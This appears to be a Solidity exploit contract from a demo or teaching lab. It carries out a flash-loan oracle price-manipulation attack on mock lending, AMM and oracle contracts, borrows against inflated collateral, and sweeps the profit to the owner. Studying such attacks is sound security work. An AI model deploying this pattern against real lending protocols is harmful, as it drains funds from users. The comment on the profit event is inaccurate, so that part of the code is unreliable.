// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./MockLendingPool.sol"; // IAaveFlashBorrowerSimple + pool
import "./SimpleAMM.sol";
import "./VulnerableLendingProtocolOracle.sol";

/**
 * @dev Flow:
 *  1) Flash-loan STABLE from the pool.
 *  2) Swap all STABLE -> COLL on AMM to push up COL price (in USD).
 *  3) Deposit acquired COLL as collateral to VulnerableLendingProtocolOracle.
 *  4) Borrow as much STABLE as allowed (inflated valuation).
 *  5) Approve pool to pull back (loan + premium).
 *  6) Keep the leftover STABLE as profit.
 */
contract PriceManipulationAttacker is IAaveFlashBorrowerSimple {
    MockLendingPool public pool;
    SimpleAMM public amm;
    VulnerableLendingProtocolOracle public protocol;
    IERC20 public coll;   // COL
    IERC20 public stable; // USD
    address public owner;

    event ProfitStable(uint256 profit);

    constructor(
        address _pool,
        address _amm,
        address _protocol,
        address _coll,
        address _stable
    ) {
        pool = MockLendingPool(_pool);
        amm = SimpleAMM(_amm);
        protocol = VulnerableLendingProtocolOracle(_protocol);
        coll = IERC20(_coll);
        stable = IERC20(_stable);
        owner = msg.sender;
    }

    function attack(uint256 flashAmount) external {
        require(msg.sender == owner, "ONLY_OWNER");
        bytes memory params = "";
        pool.flashLoanSimple(address(this), address(stable), flashAmount, params);
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address /*initiator*/,
        bytes calldata /*params*/
    ) external override returns (bool) {
        require(msg.sender == address(pool), "ONLY_POOL");
        require(asset == address(stable), "ASSET_NOT_STABLE");

        // Step 1: Swap all stable -> collateral to pump COL price
        stable.approve(address(amm), amount);
        amm.swapExactTokensForTokens(address(stable), amount, 0); // minOut = 0 for demo

        // Step 2: Deposit obtained collateral
        uint256 colBal = coll.balanceOf(address(this));
        coll.approve(address(protocol), colBal);
        protocol.depositCollateral(colBal);

        // Step 3: Borrow as much stable as allowed at the inflated price
        uint256 borrowable = protocol.maxBorrowableUSD(address(this));
        protocol.borrow(borrowable);

        // Step 4: Repay flash loan
        uint256 totalOwed = amount + premium;
        stable.approve(address(pool), totalOwed);

        // Step 5: Emit remaining STABLE as profit (what stays after pool pulls)
        uint256 bal = stable.balanceOf(address(this));
        // Note: pool will pull totalOwed after we return true; we report pre-pull projected profit.
        // For display simplicity we emit current STABLE balance; after pull, net profit is bal - 0 (then minus any future moves).
        emit ProfitStable(bal);

        return true;
    }

    /// Optional: move profits to EOA (after flash settles)
    function sweep(address to, address token) external {
        require(msg.sender == owner, "ONLY_OWNER");
        IERC20 t = IERC20(token);
        t.transfer(to, t.balanceOf(address(this)));
    }
}
